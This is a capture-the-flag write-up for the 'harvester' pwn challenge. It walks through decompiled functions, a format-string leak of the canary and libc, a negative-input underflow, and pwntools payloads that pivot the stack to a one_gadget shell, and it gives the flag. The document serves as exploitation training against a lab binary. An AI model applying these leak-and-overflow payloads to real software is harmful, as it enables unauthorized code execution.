# harvester

This was 4th binary in the challenge section named harvester.

# Vulerability

This binary had all protections enabled as in NX, PIE, RELRO and Canary. So, from a clear point of view at first, it seemed a bit hard but when we check the functions that were being called, we see a FSB in the `fight()` function and a stack overflow vulnnerability in the `stare()` function, but there were few restrictions:-

* First one was that the only 5 bytes can be printed with the vulnerable `printf` call, implying at best, we can only have leak from the stack,
* Second was, in order to get to the `stare()` function to trigger the stack overflow vulnerability we have to make the `pie` which was global variable to 22.
* One of the catch was `check_pie` function was being called depending on the functionality we trigger to check if `pie` does not exceed the value of 15, so we have to go by that.

The `fight` function:-

```C
unsigned __int64 fight()
{
  __int64 buf[5]; // [rsp+0h] [rbp-30h] BYREF
  unsigned __int64 v2; // [rsp+28h] [rbp-8h]

  v2 = __readfsqword(0x28u);
  buf[0] = 0LL;
  buf[1] = 0LL;
  buf[2] = 0LL;
  buf[3] = 0LL;
  printf("\x1B[1;36m");
  printstr("\nChoose weapon:\n");
  printstr(&unk_1138);
  read(0, buf, 5uLL);
  printstr("\nYour choice is: ");
  printf((const char *)buf);
  printf("\x1B[1;31m");
  printstr("\nYou are not strong enough to fight yet.\n");
  return __readfsqword(0x28u) ^ v2;
}
```

The bug is `prinf((const char *)buf);` and we can only give `5` bytes at most to print, so we had no arbitrary writes.

Then, we had this `stare` function which propose a vulnerable `read` call but only if the `pie` == 21, at the time of the `stare` call, so during the check, it gets incremented and be of the value 22.

```C
unsigned __int64 stare()
{
  char buf[40]; // [rsp+0h] [rbp-30h] BYREF
  unsigned __int64 v2; // [rsp+28h] [rbp-8h]

  v2 = __readfsqword(0x28u);
  printf("\x1B[1;36m");
  printstr("\nYou try to find its weakness, but it seems invincible..");
  printstr("\nLooking around, you see something inside a bush.");
  printf("\x1B[1;32m");
  printstr(&unk_129A);
  if ( ++pie == 22 )
  {
    printf("\x1B[1;32m");
    printstr("\nYou also notice that if the Harvester eats too many pies, it falls asleep.");
    printstr("\nDo you want to feed it?\n> ");
    read(0, buf, 0x40uLL);
    printf("\x1B[1;31m");
    printstr("\nThis did not work as planned..\n");
  }
  return __readfsqword(0x28u) ^ v2;
}
```

`inventory()` function allow us to subtract a certain value from the value of `pie` which by default was given the value of `10.`

```C
unsigned __int64 inventory()
{
  int v1; // [rsp+0h] [rbp-10h] BYREF
  char buf[3]; // [rsp+5h] [rbp-Bh] BYREF
  unsigned __int64 v3; // [rsp+8h] [rbp-8h]

  v3 = __readfsqword(0x28u);
  v1 = 0;
  show_pies((unsigned int)pie);
  printstr("\nDo you want to drop some? (y/n)\n> ");
  read(0, buf, 2uLL);
  if ( buf[0] == 121 )
  {
    printstr("\nHow many do you want to drop?\n> ");
    __isoc99_scanf("%d", &v1);
    pie -= v1;
    if ( pie <= 0 )
    {
      printstr(&unk_1205);
      exit(1);
    }
    show_pies((unsigned int)pie);
  }
  return __readfsqword(0x28u) ^ v3;
}
```

# Exploitation

Exploitation was rather simple, I belive, it was to make leak via the `fight()` function, we first leak the canary, followed by elf and libc address leak.

```py
fight("%11$p")
p.recvline()
p.recvuntil(": ")
canary = int(p.recv(18), 16)
fight("%20$p")
p.recvline()
p.recvuntil(": ")
elf.address = int(p.recv(14), 16) - 0x1000
fight("%21$p")
p.recvline()
p.recvuntil(": ")
libc.address = int(p.recv(14), 16) - libc.symbols['__libc_start_main'] - 0xe7


log.info(f"CANARY:   {hex(canary)}")
log.info(f"ELF   :   {hex(elf.address)}")
log.info(f"LIBC  :   {hex(libc.address)}")
```

Then, we call the `inventory` and give the value `-11` such that when subtraction will be done it'll make the value of `pie` to 21.

```py
>>> 10 - (-11)
>>> 22
```

```py

def inventory():
	p.sendlineafter("> ", "2")
	p.sendlineafter("> ", "y")
	p.sendlineafter("> ", "-11")

[..snip..]

inventory()
```

Then, it was just again the ret2libc, but since the `read` call in the `stare` function does not accept more than `0x40` bytes and the RIP offset was already 56, we only get to make use of the `one_gadget` or perform the stack pivot of some sort, so at first all the `one_gadget` failed probably because of unsatisfied constraints. So, what I did was, make a call to the 

```r
   0x0000000000000dcb <+160>:	lea    rax,[rbp-0x30]
   0x0000000000000dcf <+164>:	mov    edx,0x40
   0x0000000000000dd4 <+169>:	mov    rsi,rax
   0x0000000000000dd7 <+172>:	mov    edi,0x0

```

`base + 0xdcb` was called and the `rbp` pointed to base address, then executing `one_gadget` made it work and we get the flag.

```py
p.sendlineafter("> ", "3")

payload = b"A"*40
payload += p64(canary)
payload += p64(elf.bss() + 0x330)
payload += p64(elf.symbols['stare'] + 0xa0)

p.sendafter("> ", payload)
payload = b"A"*40
payload += p64(canary)
payload += p64(0)
payload += p64(libc.address + 0x10a41c)


p.send(payload)
p.interactive()	
```

Flag: `CHTB{h4rv35t3r_15_ju5t_4_b1g_c4n4ry}`